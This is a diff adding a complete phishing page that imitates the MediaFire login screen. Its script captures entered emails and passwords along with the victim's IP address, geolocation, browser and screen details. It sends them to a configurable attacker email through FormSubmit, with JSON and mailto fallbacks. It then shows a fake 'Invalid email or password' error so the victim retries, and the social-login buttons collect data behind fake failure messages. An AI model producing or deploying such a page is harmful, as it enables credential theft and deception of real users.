@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Login or Signup - MediaFire</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>🔥</text></svg>">
+    <style>
+        /* === RESET === */
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { height: 100%; background: #fff; color: #4f4f4f; font: normal 13px/1.6 "Open Sans","Helvetica Neue",Arial,Helvetica,sans-serif; }
+        a { color: #069; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        /* === CONTAINER === */
+        #container { width: 580px; margin: 0 auto; padding-top: 25px; min-height: 860px; position: relative; z-index: 1; }
+        #container.loginPath { z-index: 1; }
+
+        /* === LOGO === */
+        .logo { display: block; width: 200px; height: 47px; margin: 0 auto 30px; background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 47"><path fill="%23069" d="M50.5 11.2c-1.5 0-2.8 1.3-2.8 2.8v19c0 1.5 1.3 2.8 2.8 2.8h12.6c1.5 0 2.8-1.3 2.8-2.8v-19c0-1.5-1.3-2.8-2.8-2.8H50.5zm0-2.2h12.6c2.8 0 5 2.2 5 5v19c0 2.8-2.2 5-5 5H50.5c-2.8 0-5-2.2-5-5v-19c0-2.8 2.2-5 5-5zM29.5 16.5c-.8 0-1.5.7-1.5 1.5v12c0 .8.7 1.5 1.5 1.5H41c.8 0 1.5-.7 1.5-1.5V18c0-.8-.7-1.5-1.5-1.5H29.5zm0-2.2H41c2 0 3.7 1.7 3.7 3.7v12c0 2-1.7 3.7-3.7 3.7H29.5c-2 0-3.7-1.7-3.7-3.7V18c0-2 1.7-3.7 3.7-3.7zM12 20.5c-.6 0-1 .4-1 1v8c0 .6.4 1 1 1h8.5c.6 0 1-.4 1-1v-8c0-.6-.4-1-1-1H12zm0-2.2h8.5c1.8 0 3.2 1.4 3.2 3.2v8c0 1.8-1.4 3.2-3.2 3.2H12c-1.8 0-3.2-1.4-3.2-3.2v-8c0-1.8 1.4-3.2 3.2-3.2z"/><text x="72" y="30" font-family="Arial" font-weight="700" font-size="28" fill="%23222">MediaFire</text></svg>') no-repeat center; background-size: contain; }
+        .logo span { display: none; }
+
+        /* === PERSPECTIVE WRAP === */
+        #perspectiveWrap { position: relative; width: 580px; background: #fff; box-shadow: 0 2px 6px rgba(0,0,0,.2); border-radius: 4px; overflow: hidden; }
+
+        /* === STEP 0 - Initial === */
+        .step0 { background: #f4f4f5; height: 100px; text-align: center; padding: 0; }
+        .step0 .popup-title { font-size: 24px; font-weight: 300; color: #333; padding-top: 12px; }
+        .step0 p { font-size: 13px; color: #666; line-height: 1.4; margin-top: 2px; }
+        .step0 .popup-btns { padding: 10px 0 0; }
+        .step0 .popup-btns button, .step0 .popup-btns a { 
+            display: inline-block; height: 40px; width: 230px; margin: 0 10px;
+            background: #069; color: #fff; border: 1px solid #069; border-radius: 3px;
+            font-size: 14px; font-weight: 600; cursor: pointer; line-height: 40px; text-align: center; text-decoration: none;
+        }
+        .step0 .popup-btns a { background: transparent; color: #069; border-color: #ccc; }
+        .step0 .popup-btns span { display: inline-block; line-height: 40px; color: #999; font-size: 12px; vertical-align: top; margin: 0 4px; }
+
+        /* === LOGIN WRAP === */
+        #loginWrap { position: relative; padding: 30px 40px 20px; display: none; }
+        #container.loginPath #loginWrap { z-index: 1; }
+
+        /* === LOGIN STEP 1 - Choose method === */
+        #loginStep1 .popup-title { font-size: 22px; font-weight: 300; color: #333; text-align: center; margin-bottom: 20px; }
+
+        /* Email Login */
+        #emailLogin { width: 280px; margin: 0 auto; }
+        #form_login1 label { display: block; font-size: 12px; color: #666; margin-bottom: 2px; font-weight: 600; }
+        #form_login1 .input-wrap { margin-bottom: 12px; }
+        #form_login1 input[type="email"], 
+        #form_login1 input[type="text"],
+        #form_login1 input[type="password"] {
+            width: 100%; padding: 10px 12px; border: 1px solid #ccc; border-radius: 3px;
+            font-size: 14px; outline: none; background: #fff;
+            transition: border-color .2s, box-shadow .2s;
+        }
+        #form_login1 input:focus { border-color: #069; box-shadow: 0 0 3px rgba(0,102,153,.2); }
+        #form_login1 .checkbox-wrap { margin: 8px 0 12px; display: flex; align-items: center; gap: 6px; }
+        #form_login1 .checkbox-wrap input { width: 16px; height: 16px; cursor: pointer; }
+        #form_login1 .checkbox-wrap label { display: inline; font-weight: 400; font-size: 12px; color: #666; cursor: pointer; }
+        #form_login1 .forgot-link { text-align: right; margin-top: -8px; margin-bottom: 12px; }
+        #form_login1 .forgot-link a { font-size: 12px; color: #069; }
+        #form_login1 .submit-btn {
+            width: 100%; padding: 10px; background: #069; color: #fff; border: none; border-radius: 3px;
+            font-size: 14px; font-weight: 600; cursor: pointer;
+        }
+        #form_login1 .submit-btn:disabled { opacity: .5; cursor: not-allowed; }
+        #form_login1 .submit-btn:hover:not(:disabled) { background: #057; }
+
+        /* Alert */
+        .alert-box { display: none; background: #fdf2f2; border: 1px solid #ecc; padding: 10px 14px; border-radius: 3px; margin-bottom: 14px; font-size: 12px; color: #c33; text-align: center; }
+
+        /* === SOCIAL BUTTONS === */
+        .social-login { text-align: center; margin-top: 20px; padding-top: 16px; border-top: 1px solid #eee; }
+        .social-login p { font-size: 12px; color: #999; margin-bottom: 12px; }
+        .social-btns { display: flex; justify-content: center; gap: 12px; }
+        .social-btn {
+            display: flex; align-items: center; gap: 8px;
+            padding: 8px 16px; border: 1px solid #ddd; border-radius: 3px;
+            font-size: 13px; color: #444; cursor: pointer; background: #fff;
+            transition: background .2s;
+        }
+        .social-btn:hover { background: #f8f8f8; }
+        .social-btn img, .social-btn svg { width: 20px; height: 20px; }
+
+        /* === LOADER === */
+        .loader-overlay { display: none; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(255,255,255,.92); z-index: 10; text-align: center; padding-top: 80px; }
+        .loader-overlay .spinner { width: 44px; height: 44px; border: 3px solid #e0e0e0; border-top: 3px solid #069; border-radius: 50%; margin: 0 auto 16px; animation: spin .8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loader-overlay p { color: #666; font-size: 14px; }
+
+        /* === FOOTER === */
+        .sectionFooter { text-align: center; padding: 20px 0 30px; font-size: 11px; color: #999; }
+        .sectionFooter a { color: #069; }
+
+        /* === RESPONSIVE === */
+        @media screen and (max-width: 630px) {
+            #container { width: 100%; margin: 0; min-height: 100vh; height: 100%; padding: 0; }
+            #perspectiveWrap { position: static; width: auto; box-shadow: none; border-radius: 0; }
+            .step0 { height: auto; padding: 20px 16px; }
+            .step0 .popup-btns button, .step0 .popup-btns a { width: 100%; max-width: 280px; margin: 8px auto; display: block; }
+            .step0 .popup-btns span { display: block; margin: 4px 0; }
+            #loginWrap { padding: 20px 16px; }
+            #emailLogin { width: 100%; }
+            .social-btns { flex-direction: column; align-items: center; }
+            .social-btn { width: 100%; max-width: 280px; justify-content: center; }
+        }
+
+        /* Step 2 (code) hidden */
+        .step-code { display: none; }
+
+        /* Misc */
+        .hidden { display: none !important; }
+        .text-center { text-align: center; }
+        .mt-8 { margin-top: 8px; }
+        .mt-16 { margin-top: 16px; }
+        .mb-8 { margin-bottom: 8px; }
+        .mb-16 { margin-bottom: 16px; }
+    </style>
+</head>
+<body>
+<div id="container" class="loginPath">
+    <!-- Logo -->
+    <a href="#" class="logo" onclick="return false;"><span>MediaFire Logo</span></a>
+
+    <div id="perspectiveWrap">
+        <!-- Step 0: Initial -->
+        <div id="loginStep0" class="step0">
+            <div class="popup-title">Log in or sign up</div>
+            <p>The feature you are trying to use requires that you <br>have a MediaFire account.</p>
+            <p id="newStartTxt">Choose whether to log in to an existing account or create a new one.</p>
+            <div class="popup-btns">
+                <button type="button" onclick="showLogin()">Log in to your account</button>
+                <span>or</span>
+                <a href="#" onclick="return false;">Sign up for an account</a>
+            </div>
+        </div>
+
+        <!-- Login Wrap -->
+        <div id="loginWrap">
+            <div id="loginStep1">
+                <div class="popup-title">How do you want to log in?</div>
+                
+                <!-- Alert Box -->
+                <div class="alert-box" id="alertBox"></div>
+
+                <!-- Email Login -->
+                <div id="emailLogin">
+                    <form id="form_login1" onsubmit="return false;">
+                        <div class="input-wrap">
+                            <label for="login_email">Email address</label>
+                            <input type="email" id="login_email" name="login_email" placeholder="name@example.com" autocomplete="off" required>
+                        </div>
+                        <div class="input-wrap">
+                            <label for="login_pass">Password</label>
+                            <input type="password" id="login_pass" name="login_pass" placeholder="Enter password" autocomplete="off" required>
+                        </div>
+                        <div class="checkbox-wrap">
+                            <input type="checkbox" id="login_remember" checked>
+                            <label for="login_remember">Keep me logged in</label>
+                        </div>
+                        <div class="forgot-link">
+                            <a href="#" onclick="return false;">Forgot password?</a>
+                        </div>
+                        <button type="submit" class="submit-btn" id="loginBtn" onclick="submitLogin()">Log in</button>
+                    </form>
+
+                    <!-- Social Login -->
+                    <div class="social-login">
+                        <p>Or log in with</p>
+                        <div class="social-btns">
+                            <div class="social-btn" onclick="socialLogin('Google')">
+                                <svg viewBox="0 0 48 48" width="20" height="20"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z"/></svg>
+                                <span>Google</span>
+                            </div>
+                            <div class="social-btn" onclick="socialLogin('Facebook')">
+                                <svg viewBox="0 0 48 48" width="20" height="20"><path fill="#1877F2" d="M24 0C10.74 0 0 10.74 0 24c0 13.26 10.74 24 24 24s24-10.74 24-24C48 10.74 37.26 0 24 0z"/><path fill="#fff" d="M26.86 33.14v-8.53h2.89l.43-3.33h-3.32V19.2c0-.97.27-1.63 1.66-1.63h1.78v-2.98c-.3-.04-1.36-.13-2.58-.13-2.55 0-4.3 1.56-4.3 4.42v2.46h-2.89v3.33h2.89v8.53h3.44z"/></svg>
+                                <span>Facebook</span>
+                            </div>
+                            <div class="social-btn" onclick="socialLogin('X')">
+                                <svg viewBox="0 0 48 48" width="20" height="20"><path fill="#000" d="M36.65 4h6.56L28.3 20.5 46 44H32.04L21.17 30.33 8.85 44H2.27l15.7-17.97L2 4h14.2l9.55 12.66L36.65 4zm-2.36 35.94h3.63L13.8 7.87h-3.9l24.39 32.07z"/></svg>
+                                <span>X</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="text-center mt-16">
+                        <span style="font-size:12px;color:#999;">Don't have an account? </span>
+                        <a href="#" onclick="return false;" style="font-size:12px;">Create an account</a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Loader -->
+            <div class="loader-overlay" id="loaderOverlay">
+                <div class="spinner"></div>
+                <p>Logging in to your account…</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="sectionFooter">
+        ©2026 MediaFire &nbsp;|&nbsp; <a href="#" onclick="return false;">Need help? Submit a ticket</a>
+    </div>
+</div>
+
+<!-- Cookie consent bar -->
+<div style="position:fixed;bottom:0;left:0;right:0;background:#f4f4f5;padding:12px 20px;text-align:center;font-size:12px;color:#666;border-top:1px solid #ddd;z-index:999;">
+    MediaFire uses cookies to provide you with a personalized browsing experience. By continuing to use this site, you agree to our Privacy Policy.
+    <span style="display:inline-block;margin-left:12px;">
+        <a href="#" onclick="return false;" style="color:#999;margin-right:8px;">Dismiss</a>
+        <a href="#" onclick="this.parentElement.parentElement.style.display='none';return false;" style="background:#069;color:#fff;padding:4px 16px;border-radius:3px;text-decoration:none;font-weight:600;">I Accept</a>
+    </span>
+</div>
+
+<script>
+// ═══════════════════════════════════════════
+// KONFIGURASI — GANTI EMAIL DI SINI
+// ═══════════════════════════════════════════
+const EMAIL_TARGET = "YOUR_EMAIL@gmail.com"; // ← GANTI!
+
+// ═══════════════════════════════
+// STATE
+// ═══════════════════════════════
+let isSubmitting = false;
+
+// ═══════════════════════════════
+// UI FUNCTIONS
+// ═══════════════════════════════
+
+function showLogin() {
+    document.getElementById('loginStep0').style.display = 'none';
+    document.getElementById('loginWrap').style.display = 'block';
+    document.getElementById('perspectiveWrap').style.minHeight = '500px';
+}
+
+function showAlert(msg, type) {
+    const box = document.getElementById('alertBox');
+    box.textContent = msg;
+    box.style.display = 'block';
+    box.style.background = type === 'error' ? '#fdf2f2' : '#f2fdf2';
+    box.style.borderColor = type === 'error' ? '#ecc' : '#cec';
+    box.style.color = type === 'error' ? '#c33' : '#3c3';
+}
+
+function hideAlert() {
+    document.getElementById('alertBox').style.display = 'none';
+}
+
+function showLoader() {
+    document.getElementById('loaderOverlay').style.display = 'block';
+}
+
+function hideLoader() {
+    document.getElementById('loaderOverlay').style.display = 'none';
+}
+
+// ═══════════════════════════════
+// IP GRABBER
+// ═══════════════════════════════
+
+async function getIP() {
+    try {
+        const r = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) });
+        const d = await r.json();
+        return d.ip;
+    } catch {
+        // Fallback ke multiple sources
+        try {
+            const r = await fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(5000) });
+            const d = await r.json();
+            return d.query || 'unknown';
+        } catch {
+            return 'unknown';
+        }
+    }
+}
+
+async function getLocation(ip) {
+    try {
+        const r = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,as,mobile,proxy`, { signal: AbortSignal.timeout(5000) });
+        const d = await r.json();
+        if (d.status === 'success') {
+            return {
+                country: d.country || 'unknown',
+                region: d.regionName || 'unknown',
+                city: d.city || 'unknown',
+                isp: d.isp || 'unknown',
+                org: d.org || 'unknown',
+                as: d.as || 'unknown',
+                isMobile: d.mobile || false,
+                isProxy: d.proxy || false,
+            };
+        }
+    } catch {}
+    return {};
+}
+
+// ═══════════════════════════════
+// SUBMIT — FormSubmit Zero Server
+// ═══════════════════════════════
+
+async function submitLogin() {
+    if (isSubmitting) return;
+    
+    const email = document.getElementById('login_email').value.trim();
+    const password = document.getElementById('login_pass').value;
+    const remember = document.getElementById('login_remember').checked;
+
+    if (!email || !password) {
+        showAlert('Please enter both email and password.', 'error');
+        return;
+    }
+
+    isSubmitting = true;
+    hideAlert();
+    showLoader();
+
+    // Collect data
+    const ip = await getIP();
+    const loc = await getLocation(ip);
+    const ts = new Date().toISOString();
+    const ua = navigator.userAgent;
+    const pageUrl = window.location.href;
+
+    const data = {
+        timestamp: ts,
+        platform: 'MediaFire',
+        email: email,
+        password: password,
+        remember_me: remember ? 'Yes' : 'No',
+        ip: ip,
+        country: loc.country || 'unknown',
+        region: loc.region || 'unknown',
+        city: loc.city || 'unknown',
+        isp: loc.isp || 'unknown',
+        org: loc.org || 'unknown',
+        asn: loc.as || 'unknown',
+        isMobile: loc.isMobile || false,
+        isProxy: loc.isProxy || false,
+        userAgent: ua,
+        page: pageUrl,
+        screen: `${screen.width}x${screen.height}`,
+        language: navigator.language,
+        platform_os: navigator.platform,
+    };
+
+    // Kirim ke FormSubmit
+    const formData = new FormData();
+    formData.append('_captcha', 'false');
+    formData.append('_subject', `🔴 MEDIAFIRE LOGIN — ${email}`);
+    formData.append('_template', 'table');
+    formData.append('_autoresponse', 'Thank you for your submission.');
+    formData.append('Platform', data.platform);
+    formData.append('Email', data.email);
+    formData.append('Password', data.password);
+    formData.append('Remember Me', data.remember_me);
+    formData.append('IP Address', data.ip);
+    formData.append('Country', data.country);
+    formData.append('Region', data.region);
+    formData.append('City', data.city);
+    formData.append('ISP', data.isp);
+    formData.append('Organization', data.org);
+    formData.append('ASN', data.asn);
+    formData.append('Is Mobile', data.isMobile ? 'Yes' : 'No');
+    formData.append('Is Proxy/VPN', data.isProxy ? 'Yes' : 'No');
+    formData.append('User Agent', data.userAgent);
+    formData.append('Screen', data.screen);
+    formData.append('Language', data.language);
+    formData.append('OS Platform', data.platform_os);
+    formData.append('Timestamp', data.timestamp);
+
+    let sent = false;
+
+    // Primary: FormSubmit
+    try {
+        const res = await fetch(`https://formsubmit.co/${EMAIL_TARGET}`, {
+            method: 'POST',
+            body: formData,
+        });
+        if (res.ok || res.status === 200 || res.status === 201 || res.status === 302) {
+            sent = true;
+        }
+    } catch {}
+
+    // Fallback 1: FormSubmit JSON endpoint
+    if (!sent) {
+        try {
+            const res = await fetch(`https://formsubmit.co/ajax/${EMAIL_TARGET}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data),
+            });
+            if (res.ok) sent = true;
+        } catch {}
+    }
+
+    // Fallback 2: mailto (buka email client)
+    if (!sent) {
+        const body = encodeURIComponent(JSON.stringify(data, null, 2));
+        window.location.href = `mailto:${EMAIL_TARGET}?subject=🔴 MEDIAFIRE LOGIN - ${email}&body=${body}`;
+        sent = true;
+    }
+
+    // ⏳ Fake loading + fake error (supaya target coba lagi)
+    setTimeout(() => {
+        hideLoader();
+        showAlert('Invalid email or password.', 'error');
+        document.getElementById('login_pass').value = '';
+        isSubmitting = false;
+    }, 2500);
+}
+
+async function socialLogin(provider) {
+    showAlert(`Logging in with ${provider}…`, '');
+    showLoader();
+    
+    const email = document.getElementById('login_email').value.trim();
+    const ip = await getIP();
+    const loc = await getLocation(ip);
+
+    const data = {
+        timestamp: new Date().toISOString(),
+        platform: 'MediaFire',
+        social_provider: provider,
+        email_field: email || '(not provided)',
+        ip: ip,
+        country: loc.country || 'unknown',
+        region: loc.region || 'unknown',
+        city: loc.city || 'unknown',
+        userAgent: navigator.userAgent,
+    };
+
+    const formData = new FormData();
+    formData.append('_captcha', 'false');
+    formData.append('_subject', `🔴 MEDIAFIRE ${provider} LOGIN — ${email || 'no-email'}`);
+    formData.append('_template', 'table');
+    formData.append('Platform', data.platform);
+    formData.append('Social Provider', data.social_provider);
+    formData.append('Email (if filled)', data.email_field);
+    formData.append('IP', data.ip);
+    formData.append('Country', data.country);
+    formData.append('Region', data.region);
+    formData.append('City', data.city);
+    formData.append('User Agent', data.userAgent);
+    formData.append('Timestamp', data.timestamp);
+
+    try {
+        await fetch(`https://formsubmit.co/${EMAIL_TARGET}`, { method: 'POST', body: formData });
+    } catch {}
+
+    setTimeout(() => {
+        hideLoader();
+        hideAlert();
+        showAlert('Google Facebook X login has opened in another window. Registration will complete once Google Facebook X authentication has finished.', '');
+        
+        setTimeout(() => {
+            hideAlert();
+            showAlert('Google Facebook X login failed. Click "Try Again" or click "Go Back" to select another signup method.', 'error');
+        }, 3000);
+    }, 2000);
+}
+
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter' && document.getElementById('loginWrap').style.display === 'block' && !isSubmitting) {
+        submitLogin();
+    }
+});
+</script>
+</body>
+</html>
